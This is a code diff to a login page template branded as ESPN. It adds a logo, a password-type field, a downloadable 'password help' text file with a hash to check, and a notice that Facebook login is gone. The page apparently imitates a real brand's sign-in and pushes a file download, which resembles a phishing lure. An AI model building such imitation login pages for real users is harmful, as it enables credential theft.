@@ -3,19 +3,26 @@
 <html>
 <head>
     <link rel="stylesheet" href="../static/main.css">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}">
     <title>Log In</title>
 </head>
 
 <body>
     <div class="wrapper">
         <div class="login">
-            <p>ESPN</p>
+            <img src="../static/espn-logo.png">
             <form action="/login" method="POST">
                 <input type="text" id="user" name="user" placeholder="Username or Email Address"><br>
-                <input type="text" id="pass" name="pass" placeholder="Password (case sensitive)"><br>
-                <input type="submit" value="Login">
+                <input type="password" id="pass" name="pass" placeholder="Password (case sensitive)"><br>
+                <input type="submit" value="Log In">
             </form>
+            <a href="../static/passwordhelp.txt" download>Need help logging in?</a>
+            <div class="blurb">Facebook log in is no longer available. For help logging in, please use the link above and verify
+                it using the SHA-256 Hash: DEF42E6CBFA9BBC0EEB894E57A292040E93A5C119624094F<br>CD2B09BA1C38E8C6.
+            </div>
+            <button>Sign Up</button>
         </div>
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30"><path fill="#333" d="M29.3 2.8L17.2 15l12.2 12.2-2.1 2.2L15 17.1 2.8 29.4.7 27.2 12.8 15 .7 2.8 2.8.6 15 12.9 27.2.6l2.1 2.2z"/></svg>
     </div>
 </body>
 
